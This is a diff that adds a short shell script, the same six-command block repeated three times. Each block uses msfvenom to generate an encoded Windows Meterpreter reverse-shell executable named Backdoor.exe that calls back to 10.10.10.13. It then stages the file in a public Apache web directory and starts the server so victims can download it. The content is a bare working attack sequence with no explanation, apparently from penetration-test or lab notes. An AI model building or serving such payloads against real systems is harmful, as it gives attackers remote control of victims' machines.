@@ -1,0 +1,20 @@
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.13 -f exe > Desktop/Backdoor.exe
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+service apache2 start
+cp /root/Desktop/Backdoor.exe /var/www/html/share
+
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.13 -f exe > Desktop/Backdoor.exe
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+service apache2 start
+cp /root/Desktop/Backdoor.exe /var/www/html/share
+
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.13 -f exe > Desktop/Backdoor.exe
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+service apache2 start
+cp /root/Desktop/Backdoor.exe /var/www/html/share
